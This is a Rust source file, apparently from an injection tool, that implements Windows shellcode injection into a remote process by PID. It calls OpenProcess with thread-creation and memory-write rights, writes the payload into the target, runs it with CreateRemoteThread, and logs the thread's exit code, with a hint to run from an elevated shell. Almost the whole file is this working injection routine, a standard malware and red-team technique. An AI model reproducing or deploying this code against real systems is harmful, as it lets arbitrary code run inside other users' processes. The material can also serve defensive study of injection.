use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    pid: u32,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use super::common::{free_remote, write_remote_payload};
    use windows::Win32::Foundation::{CloseHandle, FALSE, WAIT_OBJECT_0};
    use windows::Win32::System::Threading::{
        CreateRemoteThread, GetExitCodeThread, OpenProcess, WaitForSingleObject, INFINITE,
        LPTHREAD_START_ROUTINE, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    log.step(format!(
        "[1/6] OpenProcess(PID {}) — PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
        pid
    ));
    let process_access = PROCESS_CREATE_THREAD
        | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION
        | PROCESS_VM_READ
        | PROCESS_VM_WRITE;
    let process = unsafe { OpenProcess(process_access, FALSE, pid) }.map_err(|e| {
        format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
    })?;

    let size = shellcode.len();
    let base = write_remote_payload(process, shellcode, 6, log)?;

    log.step(format!(
        "[5/6] CreateRemoteThread — start at remote address {:#p}",
        base
    ));
    let start: LPTHREAD_START_ROUTINE = Some(unsafe {
        core::mem::transmute::<
            *mut core::ffi::c_void,
            unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
        >(base)
    });
    let mut thread_id: u32 = 0;
    let thread = match unsafe {
        CreateRemoteThread(
            process,
            None,
            0,
            start,
            Some(base as *const core::ffi::c_void),
            0,
            Some(&mut thread_id),
        )
    } {
        Ok(h) => h,
        Err(e) => {
            free_remote(process, base, log);
            let _ = unsafe { CloseHandle(process) };
            return Err(format!("CreateRemoteThread failed: {e}"));
        }
    };
    log.info(format!("      remote thread started (TID {})", thread_id));

    log.step("[6/6] WaitForSingleObject — waiting for remote thread to finish");
    let wait = unsafe { WaitForSingleObject(thread, INFINITE) };
    if wait != WAIT_OBJECT_0 {
        free_remote(process, base, log);
        let _ = unsafe { CloseHandle(thread) };
        let _ = unsafe { CloseHandle(process) };
        return Err(format!(
            "WaitForSingleObject returned {} (expected WAIT_OBJECT_0)",
            wait.0
        ));
    }
    let mut exit_code: u32 = 0;
    if let Err(e) = unsafe { GetExitCodeThread(thread, &mut exit_code) } {
        free_remote(process, base, log);
        let _ = unsafe { CloseHandle(thread) };
        let _ = unsafe { CloseHandle(process) };
        return Err(format!("GetExitCodeThread failed: {e}"));
    }
    let _ = unsafe { CloseHandle(thread) };
    let _ = unsafe { CloseHandle(process) };

    if exit_code == 259 {
        return Err("remote thread is still active after an INFINITE wait".to_string());
    }
    if exit_code == 0xC0000005 {
        log.error(format!(
            "      remote thread CRASHED — exit code 0x{:X} (ACCESS_VIOLATION)",
            exit_code
        ));
        log.error("      the shellcode hit an invalid memory access");
        log.error(
            "      the injection pipeline is OK (NOP payload works) — the payload is broken",
        );
    } else if exit_code >= 0xC0000000 {
        log.warning(format!(
            "      remote thread exited with NTSTATUS error 0x{:X}",
            exit_code
        ));
    } else {
        log.info(format!(
            "      remote thread exited with code {}",
            exit_code
        ));
    }
    log.info(format!(
        "      shellcode remains at remote address {:#p} ({} bytes)",
        base, size
    ));
    Ok(InjectionResult {
        remote_base: base as u64,
        size,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _pid: u32,
    _shellcode: &[u8],
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
}
